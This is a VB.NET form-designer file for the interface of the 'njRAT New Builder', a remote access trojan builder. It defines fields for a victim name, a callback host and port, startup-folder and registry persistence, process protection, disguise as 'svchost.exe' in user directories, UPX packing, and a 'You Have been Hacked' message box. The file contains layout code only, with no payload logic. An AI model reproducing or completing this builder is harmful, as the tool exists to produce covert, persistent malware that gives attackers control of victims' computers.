<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Descartar substituições de formulário para limpar a lista de componentes.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Exigido pelo Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'OBSERVAÇÃO: O procedimento a seguir é exigido pelo Windows Form Designer
    'Ele pode ser modificado usando o Windows Form Designer.  
    'Não o modifique usando o editor de códigos.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.vt_txt = New System.Windows.Forms.TextBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TXT_Host = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.nd_port = New System.Windows.Forms.NumericUpDown()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.CK_ProtectProcess = New System.Windows.Forms.CheckBox()
        Me.CK_CopyStartUp = New System.Windows.Forms.CheckBox()
        Me.CK_RegistryStartUp = New System.Windows.Forms.CheckBox()
        Me.CK_Copy = New System.Windows.Forms.CheckBox()
        Me.process_txt = New System.Windows.Forms.TextBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.CB_Directory = New System.Windows.Forms.ComboBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.message_text = New System.Windows.Forms.TextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.title_text = New System.Windows.Forms.TextBox()
        Me.CK_Msgbox = New System.Windows.Forms.CheckBox()
        Me.btn_OK = New System.Windows.Forms.Button()
        Me.GB_Message = New System.Windows.Forms.GroupBox()
        Me.CKUpx = New System.Windows.Forms.CheckBox()
        Me.GB_DER = New System.Windows.Forms.GroupBox()
        CType(Me.nd_port, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GB_Message.SuspendLayout()
        Me.GB_DER.SuspendLayout()
        Me.SuspendLayout()
        '
        'vt_txt
        '
        Me.vt_txt.BackColor = System.Drawing.Color.Black
        Me.vt_txt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.vt_txt.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.vt_txt.ForeColor = System.Drawing.Color.White
        Me.vt_txt.Location = New System.Drawing.Point(15, 25)
        Me.vt_txt.Name = "vt_txt"
        Me.vt_txt.Size = New System.Drawing.Size(292, 22)
        Me.vt_txt.TabIndex = 0
        Me.vt_txt.Text = "Hacked"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.Location = New System.Drawing.Point(12, 9)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(81, 13)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Victim (Name)"
        '
        'TXT_Host
        '
        Me.TXT_Host.BackColor = System.Drawing.SystemColors.InfoText
        Me.TXT_Host.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TXT_Host.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TXT_Host.ForeColor = System.Drawing.Color.White
        Me.TXT_Host.Location = New System.Drawing.Point(15, 71)
        Me.TXT_Host.Name = "TXT_Host"
        Me.TXT_Host.Size = New System.Drawing.Size(207, 22)
        Me.TXT_Host.TabIndex = 2
        Me.TXT_Host.Text = "127.0.0.1"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.Location = New System.Drawing.Point(12, 55)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(31, 13)
        Me.Label2.TabIndex = 3
        Me.Label2.Text = "Host"
        '
        'nd_port
        '
        Me.nd_port.BackColor = System.Drawing.SystemColors.InfoText
        Me.nd_port.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.nd_port.ForeColor = System.Drawing.Color.White
        Me.nd_port.Location = New System.Drawing.Point(228, 71)
        Me.nd_port.Maximum = New Decimal(New Integer() {1316134911, 2328, 0, 0})
        Me.nd_port.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nd_port.Name = "nd_port"
        Me.nd_port.Size = New System.Drawing.Size(79, 22)
        Me.nd_port.TabIndex = 4
        Me.nd_port.Value = New Decimal(New Integer() {1177, 0, 0, 0})
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.Location = New System.Drawing.Point(225, 57)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(29, 13)
        Me.Label3.TabIndex = 5
        Me.Label3.Text = "Port"
        '
        'CK_ProtectProcess
        '
        Me.CK_ProtectProcess.AutoSize = True
        Me.CK_ProtectProcess.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CK_ProtectProcess.Location = New System.Drawing.Point(385, 30)
        Me.CK_ProtectProcess.Name = "CK_ProtectProcess"
        Me.CK_ProtectProcess.Size = New System.Drawing.Size(105, 17)
        Me.CK_ProtectProcess.TabIndex = 6
        Me.CK_ProtectProcess.Text = "Protect Process"
        Me.CK_ProtectProcess.UseVisualStyleBackColor = True
        '
        'CK_CopyStartUp
        '
        Me.CK_CopyStartUp.AutoSize = True
        Me.CK_CopyStartUp.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CK_CopyStartUp.Location = New System.Drawing.Point(385, 62)
        Me.CK_CopyStartUp.Name = "CK_CopyStartUp"
        Me.CK_CopyStartUp.Size = New System.Drawing.Size(95, 17)
        Me.CK_CopyStartUp.TabIndex = 7
        Me.CK_CopyStartUp.Text = "Copy StartUp"
        Me.CK_CopyStartUp.UseVisualStyleBackColor = True
        '
        'CK_RegistryStartUp
        '
        Me.CK_RegistryStartUp.AutoSize = True
        Me.CK_RegistryStartUp.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CK_RegistryStartUp.Location = New System.Drawing.Point(385, 95)
        Me.CK_RegistryStartUp.Name = "CK_RegistryStartUp"
        Me.CK_RegistryStartUp.Size = New System.Drawing.Size(110, 17)
        Me.CK_RegistryStartUp.TabIndex = 8
        Me.CK_RegistryStartUp.Text = "Registry StartUp"
        Me.CK_RegistryStartUp.UseVisualStyleBackColor = True
        '
        'CK_Copy
        '
        Me.CK_Copy.AutoSize = True
        Me.CK_Copy.Checked = True
        Me.CK_Copy.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CK_Copy.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CK_Copy.Location = New System.Drawing.Point(264, 99)
        Me.CK_Copy.Name = "CK_Copy"
        Me.CK_Copy.Size = New System.Drawing.Size(53, 17)
        Me.CK_Copy.TabIndex = 10
        Me.CK_Copy.Text = "Copy"
        Me.CK_Copy.UseVisualStyleBackColor = True
        '
        'process_txt
        '
        Me.process_txt.BackColor = System.Drawing.SystemColors.MenuText
        Me.process_txt.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.process_txt.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.process_txt.ForeColor = System.Drawing.Color.White
        Me.process_txt.Location = New System.Drawing.Point(6, 33)
        Me.process_txt.Name = "process_txt"
        Me.process_txt.Size = New System.Drawing.Size(292, 22)
        Me.process_txt.TabIndex = 11
        Me.process_txt.Text = "svchost.exe"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.Location = New System.Drawing.Point(6, 14)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(59, 13)
        Me.Label4.TabIndex = 12
        Me.Label4.Text = "Exe Name"
        '
        'CB_Directory
        '
        Me.CB_Directory.BackColor = System.Drawing.SystemColors.MenuText
        Me.CB_Directory.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.CB_Directory.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.CB_Directory.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CB_Directory.ForeColor = System.Drawing.Color.White
        Me.CB_Directory.FormattingEnabled = True
        Me.CB_Directory.Items.AddRange(New Object() {"TEMP", "Appdata", "UserProfile"})
        Me.CB_Directory.Location = New System.Drawing.Point(6, 74)
        Me.CB_Directory.Name = "CB_Directory"
        Me.CB_Directory.Size = New System.Drawing.Size(292, 21)
        Me.CB_Directory.TabIndex = 13
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.Location = New System.Drawing.Point(6, 58)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(58, 13)
        Me.Label5.TabIndex = 14
        Me.Label5.Text = "Directorry"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label6.Location = New System.Drawing.Point(6, 60)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(53, 13)
        Me.Label6.TabIndex = 18
        Me.Label6.Text = "Message"
        Me.Label6.TextAlign = System.Drawing.ContentAlignment.TopCenter
        '
        'message_text
        '
        Me.message_text.BackColor = System.Drawing.Color.Black
        Me.message_text.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.message_text.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.message_text.ForeColor = System.Drawing.Color.White
        Me.message_text.Location = New System.Drawing.Point(6, 76)
        Me.message_text.Multiline = True
        Me.message_text.Name = "message_text"
        Me.message_text.Size = New System.Drawing.Size(296, 97)
        Me.message_text.TabIndex = 17
        Me.message_text.Text = "You Have been Hacked"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label7.Location = New System.Drawing.Point(6, 18)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(29, 13)
        Me.Label7.TabIndex = 16
        Me.Label7.Text = "Title"
        '
        'title_text
        '
        Me.title_text.BackColor = System.Drawing.Color.Black
        Me.title_text.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.title_text.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.title_text.ForeColor = System.Drawing.Color.White
        Me.title_text.Location = New System.Drawing.Point(6, 34)
        Me.title_text.Name = "title_text"
        Me.title_text.Size = New System.Drawing.Size(296, 22)
        Me.title_text.TabIndex = 15
        Me.title_text.Text = "Hello"
        Me.title_text.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'CK_Msgbox
        '
        Me.CK_Msgbox.AutoSize = True
        Me.CK_Msgbox.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CK_Msgbox.Location = New System.Drawing.Point(248, 240)
        Me.CK_Msgbox.Name = "CK_Msgbox"
        Me.CK_Msgbox.Size = New System.Drawing.Size(69, 17)
        Me.CK_Msgbox.TabIndex = 19
        Me.CK_Msgbox.Text = "MsgBox"
        Me.CK_Msgbox.UseVisualStyleBackColor = True
        '
        'btn_OK
        '
        Me.btn_OK.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btn_OK.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_OK.Location = New System.Drawing.Point(330, 263)
        Me.btn_OK.Name = "btn_OK"
        Me.btn_OK.Size = New System.Drawing.Size(218, 81)
        Me.btn_OK.TabIndex = 20
        Me.btn_OK.Text = "OK"
        Me.btn_OK.UseVisualStyleBackColor = True
        '
        'GB_Message
        '
        Me.GB_Message.Controls.Add(Me.message_text)
        Me.GB_Message.Controls.Add(Me.Label6)
        Me.GB_Message.Controls.Add(Me.title_text)
        Me.GB_Message.Controls.Add(Me.Label7)
        Me.GB_Message.Enabled = False
        Me.GB_Message.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GB_Message.ForeColor = System.Drawing.Color.White
        Me.GB_Message.Location = New System.Drawing.Point(9, 254)
        Me.GB_Message.Name = "GB_Message"
        Me.GB_Message.Size = New System.Drawing.Size(310, 179)
        Me.GB_Message.TabIndex = 21
        Me.GB_Message.TabStop = False
        Me.GB_Message.Text = "MessageBox"
        '
        'CKUpx
        '
        Me.CKUpx.AutoSize = True
        Me.CKUpx.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CKUpx.Location = New System.Drawing.Point(385, 128)
        Me.CKUpx.Name = "CKUpx"
        Me.CKUpx.Size = New System.Drawing.Size(110, 17)
        Me.CKUpx.TabIndex = 22
        Me.CKUpx.Text = "UPX (Compress)"
        Me.CKUpx.UseVisualStyleBackColor = True
        '
        'GB_DER
        '
        Me.GB_DER.Controls.Add(Me.process_txt)
        Me.GB_DER.Controls.Add(Me.Label4)
        Me.GB_DER.Controls.Add(Me.CB_Directory)
        Me.GB_DER.Controls.Add(Me.Label5)
        Me.GB_DER.Location = New System.Drawing.Point(9, 116)
        Me.GB_DER.Name = "GB_DER"
        Me.GB_DER.Size = New System.Drawing.Size(310, 108)
        Me.GB_DER.TabIndex = 24
        Me.GB_DER.TabStop = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(560, 440)
        Me.Controls.Add(Me.GB_DER)
        Me.Controls.Add(Me.CKUpx)
        Me.Controls.Add(Me.GB_Message)
        Me.Controls.Add(Me.btn_OK)
        Me.Controls.Add(Me.CK_Msgbox)
        Me.Controls.Add(Me.CK_Copy)
        Me.Controls.Add(Me.CK_RegistryStartUp)
        Me.Controls.Add(Me.CK_CopyStartUp)
        Me.Controls.Add(Me.CK_ProtectProcess)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.nd_port)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.TXT_Host)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.vt_txt)
        Me.ForeColor = System.Drawing.Color.White
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "njRAT New Builder > X-SLAYER"
        CType(Me.nd_port, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GB_Message.ResumeLayout(False)
        Me.GB_Message.PerformLayout()
        Me.GB_DER.ResumeLayout(False)
        Me.GB_DER.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents vt_txt As System.Windows.Forms.TextBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TXT_Host As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents nd_port As System.Windows.Forms.NumericUpDown
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents CK_ProtectProcess As System.Windows.Forms.CheckBox
    Friend WithEvents CK_CopyStartUp As System.Windows.Forms.CheckBox
    Friend WithEvents CK_RegistryStartUp As System.Windows.Forms.CheckBox
    Friend WithEvents CK_Copy As System.Windows.Forms.CheckBox
    Friend WithEvents process_txt As System.Windows.Forms.TextBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents CB_Directory As System.Windows.Forms.ComboBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents message_text As System.Windows.Forms.TextBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents title_text As System.Windows.Forms.TextBox
    Friend WithEvents CK_Msgbox As System.Windows.Forms.CheckBox
    Friend WithEvents btn_OK As System.Windows.Forms.Button
    Friend WithEvents GB_Message As System.Windows.Forms.GroupBox
    Friend WithEvents CKUpx As System.Windows.Forms.CheckBox
    Friend WithEvents GB_DER As System.Windows.Forms.GroupBox

End Class
